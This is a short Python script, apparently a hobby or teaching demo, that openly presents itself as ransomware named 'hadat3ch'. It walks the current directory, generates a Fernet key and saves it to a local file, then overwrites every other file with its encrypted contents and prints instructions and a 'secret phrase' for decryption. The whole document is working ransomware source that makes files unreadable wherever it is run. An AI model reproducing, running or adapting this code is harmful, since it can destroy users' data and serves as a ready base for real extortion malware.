#!/usr/bin/env python3

# --------------------------------------------------------------------------------------------------
# THIS IS THE ENCRYPTION SCRIPT
# This script will generate and encryption/decryption key an will save it in a file called
# "hadat3ch-ransomware-key.key".
# --------------------------------------------------------------------------------------------------

import os
from cryptography.fernet import Fernet # This is a encryption method

files = [] # this is the list that we are going to put all the files in a folder

# This for loop will go through all the files and will add them to the "files" list
# except from the "hadat3ch-ransomware.py" which is our script and we do not want to encrypt.
for file in os.listdir():
    if file == "hadat3ch-ransomware.py" or file == "hadat3ch-ransomware-key.key" or file == "hadat3ch-ransomware-decrypt.py":   # These are the 3 files that we do not want to encrypt. 1. Our actual script 2. The file that contains our key that we are going to use for decryption 3.The decryption script
        continue
    if os.path.isfile(file): # We want to only encrypt files not folders for example that is why we specify that it need to be only file
        files.append(file)


# This will be a key that Fernet creates and this can be used for the encryption and decryption
# ENCRYPTION/DECRYPTION KEY
key = Fernet.generate_key()


# This is a function that creates a key and saves it in a file called "hadat3ch-ransomware-key.key" This will be our key for encryption and decryption.
def create_encryption_key():
    # Saving our key to a file called "hadat3ch-ransomware-key.key"
    f = open("hadat3ch-ransomware-key.key", "wb")
    f.write(key)
    f.close

# Calling the create_encryption_key() function
create_encryption_key()

# this will loop through all the files will open the files and ancrypt the content of the files with the encryption
# key and then write the encryption outcome back to the file.
for file in files:
    with open(file, "rb") as thefile:
        contents = thefile.read()
    contents_encrypted = Fernet(key).encrypt(contents)
    with open(file, "wb") as thefile:
        thefile.write(contents_encrypted)


print("ALL THE FILES HAVE BEEN ENCRYPTED. RUN THE DECRYPTION SCRIPT TO DECRYPT THE FILES")
print("RUN THIS COMMAND: python3 hadat3ch-ransomware-decrypt.py ")
print("SECRET PHRASE: hadat3ch")